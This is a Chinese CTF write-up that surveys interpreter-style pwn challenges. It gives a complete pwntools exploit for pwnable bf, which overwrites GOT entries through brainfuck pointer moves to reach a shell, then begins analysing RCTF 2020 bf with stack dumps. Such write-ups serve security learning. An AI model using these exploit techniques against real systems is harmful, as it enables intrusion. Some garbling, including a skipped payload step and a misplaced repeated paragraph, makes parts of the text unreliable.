# 解释器类型的Pwn题目总结
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 0x01 写在前面
在近期的比赛中，发现解释器类型的题目越来越多，因此决定进行一个专项的题目总结。
  1. `Pwnable_bf`：此题是利用了`brainfuck`本身的特性以及题目没有对GOT进行保护导致我们可以便捷的进行利用。
  2. `2020 RCTF bf`：此题是因为解释器的实现存在漏洞，并不是利用语言本身的特性。
  3. `2020 DAS-CTF OJ0`：此题是直接让我们写程序来读`flag`,而我们读`flag`时又需要绕过一些题目的过滤语句~
  4. `DEFCON CTF Qualifier 2020 introool`：此题严格来说并不是实现的解释器，但是它仍然是直接依据我们的输入来生成可执行文件，属于广义上的解释器。
  5. `[Redhat2019] Kaleidoscope`：此题创新性的使用了`fuzz`来解题。
  6. `2020 DAS-CTF OJ1`：此题仍然为直接让我们写程序来读`flag`,但是他限制了所有括号的使用！
## 0x02 什么是解释器
解释器（英语`Interpreter`），又译为直译器，是一种电脑程序，能够把高级编程语言一行一行直接转译运行。解释器不会一次把整个程序转译出来，只像一位“中间人”，每次运行程序时都要先转成另一种语言再作运行，因此解释器的程序运行速度比较缓慢。它每转译一行程序叙述就立刻运行，然后再转译下一行，再运行，如此不停地进行下去。
## 0x03 以 pwnable bf 为例
###  题目信息
`32`位程序，开启了`NX`和`Canary`，`Glibc 2.23`。
根据题目所述信息，这是一个[`brainfuck`语言](https://zh.wikipedia.org/wiki/Brainfuck)的解释器。
由于`brainfuck`语言本身十分简单，因此本题中的核心处理逻辑就是`brainfuck`语言本身的处理逻辑。
###  漏洞分析
我们分析发现，此程序本身并没有可利用的漏洞，那么我们就可以利用`brainfuck`语言本身的特性来完成利用，因为题目没有对我们可操作的指针`p`做任何限制，也就是说，我们可以直接利用`brainfuck`语言本身来进行任意地址读写，那么我们的思路就很明显了，利用指针移动将`p`移动到`got`表，劫持`got`表内容即可。
我们决定将`putchar[@got](https://github.com/got
"@got")`改为`_start`，将`memset[@got](https://github.com/got
"@got")`改为`gets[@got](https://github.com/got
"@got")`，将`fgets[@got](https://github.com/got
"@got")`改为`system[@got](https://github.com/got "@got")`。
###  漏洞利用
首先，以下信息是我们已知的：
    getchar@got位于 ： 0x0804A00C
    fgets@got位于   ： 0x0804A010
    memset@got位于  ： 0x0804A02C
    putchar@got位于 ： 0x0804A030
    p 指针地址       ： 0x0804A080
接下来我们开始构造`payload`:
  1. 首先执行一次`getchar`函数。 
        payload  = ','
  2. 将指针`p`用`.>.>.>'
  4. 然后继续篡改`fgets[@got](https://github.com/got "@got")`为`system[@got](https://github.com/got "@got")`。 
        payload += ',>,>,>,>'
  5. 移动指针到`memset[@got](https://github.com/got "@got")`。 
        payload += '>' * 0x18
  6. 篡改`memset[@got](https://github.com/got "@got")`为`gets[@got](https://github.com/got "@got")`。 
        payload += ',>,>,>,>'
  7. 继续篡改`putchar[@got](https://github.com/got "@got")`为`main`。 
        payload += ',>,>,>,>'
  8. 触发`putchar`函数。 
        payload += '.'
###  FInal Exploit
    from pwn import *
    import traceback
    import sys
    context.log_level='debug'
    # context.arch='amd64'
    context.arch='i386'
    bf=ELF('./bf', checksec = False)
    if context.arch == 'amd64':
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
    elif context.arch == 'i386':
        try:
            libc=ELF("/lib/i386-linux-gnu/libc.so.6", checksec = False)
        except:
            libc=ELF("/lib32/libc.so.6", checksec = False)
    def get_sh(Use_other_libc = False , Use_ssh = False):
        global libc
        if args['REMOTE'] :
            if Use_other_libc :
                libc = ELF("./BUUOJ_libc/libc-2.23-32.so", checksec = False)
            if Use_ssh :
                s = ssh(sys.argv[3],sys.argv[1], sys.argv[2],sys.argv[4])
                return s.process("./bf")
            else:
                return remote(sys.argv[1], sys.argv[2])
        else:
            return process("./bf")
    def get_address(sh,info=None,start_string=None,address_len=None,end_string=None,offset=None,int_mode=False):
        if start_string != None:
            sh.recvuntil(start_string)
        if int_mode :
            return_address = int(sh.recvuntil(end_string,drop=True),16)
        elif address_len != None:
            return_address = u64(sh.recv()[:address_len].ljust(8,'x00'))
        elif context.arch == 'amd64':
            return_address=u64(sh.recvuntil(end_string,drop=True).ljust(8,'x00'))
        else:
            return_address=u32(sh.recvuntil(end_string,drop=True).ljust(4,'x00'))
        if offset != None:
            return_address = return_address + offset
        if info != None:
            log.success(info + str(hex(return_address)))
        return return_address
    def get_flag(sh):
        sh.sendline('cat /flag')
        return sh.recvrepeat(0.3)
    def get_gdb(sh,gdbscript=None,stop=False):
        gdb.attach(sh,gdbscript=gdbscript)
        if stop :
            raw_input()
    def Multi_Attack():
        # testnokill.__main__()
        return
    def Attack(sh=None,ip=None,port=None):
        if ip != None and port !=None:
            try:
                sh = remote(ip,port)
            except:
                return 'ERROR : Can not connect to target server!'
        try:
            # Your Code here
            payload  = ','
            payload += '.>.>.>'
            payload += ',>,>,>,>'
            payload += '>' * 0x18
            payload += ',>,>,>,>'
            payload += ',>,>,>,>'
            payload += '.'
            sh.recvuntil('type some brainfuck instructions except [ ]') 
            sh.sendline(payload)
            sh.send('x01')
            libc.address = get_address(sh=sh,info='LIBC ADDRESS --> ',start_string='n',address_len=4,offset=-libc.symbols['getchar'])
            for i in p32(libc.symbols['system']):
                sh.send(i)
            for i in p32(libc.symbols['gets']):
                sh.send(i)
            for i in p32(0x08048671):
                sh.send(i)
            sh.sendline('/bin/sh')
            sh.interactive()
            flag=get_flag(sh)
            sh.close()
            return flag
        except Exception as e:
            traceback.print_exc()
            sh.close()
            return 'ERROR : Runtime error!'
    if __name__ == "__main__":
        sh = get_sh(Use_other_libc=True)
        flag = Attack(sh=sh)
        log.success('The flag is ' + re.search(r'flag{.+}',flag).group())
## 0x04 以 2020 RCTF bf 为例
###  题目信息
`64`位程序，保护全开，`Glibc 2.27`。
根据题目所述信息，这是一个[`brainfuck`语言](https://zh.wikipedia.org/wiki/Brainfuck)的解释器。
这道题目的难度就要比`pwnable bf`难得多，首先，题目整体使用了`C++`编写，这对于我们的逆向造成了一定的难度。
然后，本题的操作指针`p`位于栈上，且做了溢出保护：
指针的前后移动不允许超出局部变量`s`和`code`的范围。
然后和`pwnable bf`相比，支持了`[`和`]`命令：
在`brainfuck`官方文档中:
    [ : 如果指针指向的单元值为零，向后跳转到对应的 ] 指令的次一指令处。
    ] : 如果指针指向的单元值不为零，向前跳转到对应的 [ 指令的次一指令处。
    [ 等价于 while (*ptr) {
    ] 等价于 }
###  漏洞分析
那么接下来，我们来做一个越界测试，我们写一个如下所示的程序：
    ptr++;
    while(*ptr){
        ptr++;
        putchar(ptr);
        (*ptr++);
    }
    getchar(ptr);
我们决定将`putchar[@got](https://github.com/got
"@got")`改为`_start`，将`memset[@got](https://github.com/got
"@got")`改为`gets[@got](https://github.com/got
"@got")`，将`fgets[@got](https://github.com/got
"@got")`改为`system[@got](https://github.com/got "@got")`。
我们可以将其理解成一个简单的`fuzz`程序，如果无漏洞发生，应当`getchar(ptr);`永远不会被执行，直到`ptr`越界指向非法内存而报错。
将其写为`brainfuck`程序应当为`+[>.+],`，我们输入到程序看看结果。
程序停了下来！说明此程序中的`[`和`]`的操作符实现必定存在问题，那么我们来看看我们读入的那一个字符被写到了哪里。
    sh.recvuntil('enter your code:')
    get_gdb(sh)
    sh.sendline('+[>.+],')
这是执行代码前的栈情况：
    gef➤  x/400gx $rsp
    0x7ffcc837f3e0:    0x00007f1cc11f99e0    0x010a7f1cc0e9aef0
    0x7ffcc837f3f0:    0x0000000100000007    0x00007f1cc12147ca
    0x7ffcc837f400:    0x00007f1cc11fa901    0x0000000000000000
    0x7ffcc837f410:    0x00005566d3bb40d0    0x00005566d3bb4100
    0x7ffcc837f420:    0x00005566d3bb40d0    0x0000000000000002
    0x7ffcc837f430:    0x00005566d3bb3e70    0x0000000000000008
    0x7ffcc837f440:    0x00005566d3bb3ec0    0x00005566d3bb3ec0
    0x7ffcc837f450:    0x00005566d3bb40c0    0x00005566d3bb3e88
    0x7ffcc837f460:    0x00005566d3bb3ec0    0x00005566d3bb3ec0
    0x7ffcc837f470:    0x00005566d3bb40c0    0x00005566d3bb3e88
    0x7ffcc837f480:    0x0000000000000000    0x0000000000000000